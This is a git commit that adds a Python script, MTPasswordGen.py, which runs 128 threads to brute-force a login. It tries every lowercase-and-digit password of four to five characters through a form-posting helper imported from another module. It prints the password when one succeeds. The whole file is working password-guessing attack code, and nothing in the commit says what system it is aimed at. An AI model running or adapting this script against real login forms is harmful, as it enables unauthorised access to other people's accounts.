69a57e04a6d46068fedd360264390ccad9c777e8
0xJ0HN7170R <116690424+0xJ0HN7170R@users.noreply.github.com>
2022-10-27 21:18:13 +0000

    Standalone version with `threading`

---
+++ MTPasswordGen.py
@@ -0,0 +1,46 @@
+import os
+import string
+from SendPostForm import PostRequest, Session
+from itertools import chain, product
+from queue import Queue
+from threading import Thread
+
+
+NUM_THREADS = 128
+q = Queue()
+
+printable = list(string.ascii_lowercase) + list(string.digits)
+
+
+def bruteforce():
+
+    SessionData = Session()
+
+    while True:
+
+        password = q.get()
+
+        # Use for benchmarking with `time python3 MTPasswordGen.py`
+        # if password == "abcd":
+        #     print("Checkpoint")
+        #     os._exit(1)
+
+        if PostRequest(SessionData, password):
+            print("Password found!: "+password)
+            os._exit(1)
+        else:
+            print("Failed using: "+password)
+
+        q.task_done()
+
+
+if __name__ == '__main__':
+
+    for t in range(NUM_THREADS):
+        Thread(target = bruteforce, daemon = True).start()
+
+    for candidate in chain.from_iterable(product(printable, repeat = i) for i in range(4, 6)):
+        pswd = "".join(candidate)
+        q.put(pswd)
+
+    q.join()
